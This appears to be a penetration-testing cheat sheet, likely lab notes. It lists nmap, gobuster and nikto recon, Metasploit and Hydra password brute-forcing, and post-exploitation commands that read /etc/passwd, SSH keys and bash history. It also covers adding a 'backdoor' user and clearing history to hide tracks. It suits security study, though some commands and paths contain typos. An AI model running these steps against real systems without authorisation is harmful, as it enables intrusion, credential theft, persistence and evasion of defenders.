**1.Recon Phase**  
\# Quick Initial Scan  
nmap \-sV \-sC \-oN initial.txt \<IP\>

\# Full Port Scan  
nmap \-p- \--min-rate 5000 \-oN full.txt \<IP\>

\-sV: Detects Service Version  
\-sC: Runs Default Scripts  
\-p-: scans all 65535 ports

Port definitions:   
**Port 80/443 (HTTP/s)**: Run **gobuster** or **feroxbuster** to brute-force, check for CMS, view source code, and check robots.txt  
**Port 21 (FTP)**: Try anonymous login   
**Port 22 (SSH)**: Note the version for potential exploits  
**Port 445 (SMB)**: Run enum4linux or smbclient  
**Port3306 (MySQL)**: Try Default Credentials

**2\. Vulnerability Identification/ Enumeration**   
\-Search CVEs for the exact version number found (searchsploit apache 2.4.49)  
\-Use tool like Nikto for web vulnerability scanning  
\-Look for misconfigured services (Weak creds, anonymous access, exposed secrets)

**Example Enumeration Command:**  
nmap \-p 90 –script **http-enum** 100.124.97.54 or nmap \-p 22 –script **ssh-auth-methods** 100.124.97.54

**Example Gobuster Command:**  
**Basic:** gobuster dir \-u http://10.10.10.10 \-w /path/to/wordlist.txt  
**dir:** to use “directory enumeration” mode  
**\-u:** the target URL  
 **\-w:** The wordlist

**Example Nikto Commands:**  
nikto \-h \<IP/URL\>: Basic Scan (default port 80\)  
nikto \-h \<URL\> \-ssl: Forces scan to use HTTPS (usually port 443\)  
nikto \-h \<URL\> \-p 8080: Specific Port: Scans a web service running on a non-standard port  
nikto \-h \<URL\> \-o report.html \-F html: Exports findings to an HTML file for easy reading   
nitko \-h \<URL\> \-Tuning 4: Tuning focuses the scan on specific types   
\*\*\* nikto is extremely noisy and can be easily detected by firewalls \*\*\*  
**3\. Exploitation**   
**Metasploit**: Swiss Army Knife for Exploitation  
Example Code:  
msfconsole (launch of metasploit)  
search \[name\] (ex: search eternalblue)  
use \[path\] (model selection)  
show options   
Set RHOSTS \[IP\] (sets remote host target IP address)  
exploit or run 

**Hydra**: Designed to guess passwords for SSH, FTP, HTTP-POST, Telnet, etc. Highspeed thousand combinations from wordlist)  
Example Code:  
hydra \-l \[user\] \-P \[wordlist.txt\] \[target\_ip\] \[service\]    
ex: hydra \-l lab \-P /usr/share/wordlists/rockyou.txt 100.x.x.x ssh  
\-l: for single user and \-L for list of users  
\-p: for single known password and \-P for a list of passwords and wordlists  
\-t: for a number of parallel tasks. Default is 16; higher is faster but could crash the target.

**Phase 4 Post-exploitation**

1. **Basic Situational Awareness**  
   1. Whoami (username)  
   2. Id (Previleges)	  
   3. Uname \-a (kernel version)  
   4. Cat /etc/passwd (list all username in the system)  
2. **Check for Privilege**   
   1. Sudo \-l (Check what sudo commands you can run without a password:)  
   2. find / \-perm \-u=s \-type f 2\>/dev/null (Then check for SUID binaries — programs that run as root even when a normal user executes them:)  
3. **Look for Sensitive files**  
   1. find / \-name "\*.conf" 2\>/dev/null  
   2. find / \-name "id\_rsa" 2\>/dev/null  
   3. cat \~/.bash\_history  
      1. .bash\_history often contains admins typed password in commands  
4. **Create a backdoor user**  
   1. Sudo useradd \-m \-s /bin/bash/ backdoor (-m creates home directory \-s: sets the default language the user uses when logging in)  
   2. Sudo passwd backdoor (new name of the acc)

**Phase 5 Covering tracks \- and how defenders catch it**

1. **Clear bash history**   
   1. **History \-c**   
   2. **Cat /dev/null \> \~/.nbash+history**

**Remote Code Execution (RCE) / Code Injection / Command Execution, Injection**  
Can use:  find / \-name “filename.py” 2\> /dev/null      
Result: /usr/share/exploitdb/exploits/linux/webapps/41738.py

**Example:**   
	cp /user/share/exploitdb/exploits/linux.webapps/4713.py ./expolit1.py 

If the file is…

1. **Txt**: exploiting guide \-\> need manual programming  
2. .**py, .rb**: can be copied and paste to use right away  
   1. python exploit.py    
   2. Ruby exploit.rb  
3. .**C**: needs to be compiled. Need to use gcc  
   1. gcc exploit.c \-o exploit 

   

   
